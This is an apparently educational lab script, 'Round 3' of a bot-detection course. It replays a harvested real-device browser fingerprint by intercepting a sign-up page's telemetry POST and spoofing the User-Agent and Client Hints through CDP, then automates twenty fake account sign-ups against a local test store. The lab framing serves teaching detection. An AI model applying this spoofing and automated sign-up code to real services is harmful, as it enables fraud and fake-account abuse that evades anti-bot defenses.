"""
Chapter 2, Round 3 attack: replay a harvested real fingerprint (Section 2.7).

Objective: stop lying inside the page. Lies get caught because the attacker cannot patch every
context. So the attacker does not patch anything. They let the collector run, intercept its POST
to /api/telemetry and swap in a complete, consistent payload "harvested" from one real Windows PC
(data/harvested_fp.json). Fingerprint shops sell exactly this.

To make the headers agree with the payload, the attacker sets the full User-Agent *and* Client
Hints metadata through the Chrome DevTools Protocol (Emulation.setUserAgentOverride). That is the
step W1 Ch4 Round 5 ended on: every header is now genuine-looking, brands included.

L1 sees a real NVIDIA GPU, L2 finds no contradictions. The weakness: it is the same device every time.

Expected results:
  - DEFENSE_LEVEL<=2: 20/20 created
  - DEFENSE_LEVEL>=3: 3/20, then fp:fingerprint_linked ("3 accounts today from device ...")

Run the store first, set the level (2 to see it succeed, 3 to see it stopped), then:
    python attacks/round3_replay_signup.py [--signups 20] [--payload you.json]
"""

import json
import os

from playwright.sync_api import sync_playwright

from _common import bot_email, common_args, finish, new_context, report, reset, sign_up

HERE = os.path.dirname(os.path.abspath(__file__))
HARVESTED = os.path.join(HERE, "data", "harvested_fp.json")


def load_payload(path=HARVESTED):
    """Accepts data/harvested_fp.json or a profile downloaded from /lab/fp/profile."""
    with open(path) as f:
        data = json.load(f)
    if "users" in data:
        return data["users"][0]["payload"]
    return data["payload"]


def ua_override(fp):
    """CDP Emulation.setUserAgentOverride params that match the payload exactly."""
    nav, uad = fp["nav"], fp.get("uad") or {}
    high = uad.get("high") or {}
    split = lambda items: [{"brand": b.rsplit("/", 1)[0], "version": b.rsplit("/", 1)[1]} for b in items]
    params = {"userAgent": nav["userAgent"], "platform": nav["platform"],
              "acceptLanguage": ",".join(nav.get("languages") or ["en-US"])}
    if uad:
        params["userAgentMetadata"] = {
            "brands": split(uad["brands"]), "fullVersionList": split(high.get("fullVersionList", [])),
            "platform": uad["platform"], "platformVersion": high.get("platformVersion", ""),
            "architecture": high.get("architecture", ""), "bitness": high.get("bitness", ""),
            "model": high.get("model", ""), "mobile": uad.get("mobile", False)}
    return params


def replay_signup(context, fp, email):
    """One sign-up whose telemetry body is replaced by `fp` (keeping the session nonce)."""
    page = context.new_page()
    cdp = context.new_cdp_session(page)
    cdp.send("Emulation.setUserAgentOverride", ua_override(fp))

    def swap(route):
        original = json.loads(route.request.post_data or "{}")
        if original.get("kind") != "fp":
            return route.fallback()
        # fallback (not continue): the context's localhost guard still sees the request
        route.fallback(post_data=json.dumps({**fp, "kind": "fp", "nonce": original.get("nonce")}))

    page.route("**/api/telemetry", swap)
    return sign_up(page, email)


def run(signups=20, verbose=False, payload_path=HARVESTED):
    fp = load_payload(payload_path)
    results = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        for i in range(signups):
            context = new_context(browser, "round3_replay_signup", i)
            results.append(replay_signup(context, fp, bot_email(3, i)))
            context.close()
        browser.close()
    if verbose:
        report("Round 3: one harvested fingerprint, replayed", results)
    return results


if __name__ == "__main__":
    args = common_args(__doc__.split("\n")[1], payload=HARVESTED).parse_args()
    if not args.no_reset:
        reset()
    finish("round3_replay_signup", run(args.signups, verbose=True, payload_path=args.payload))
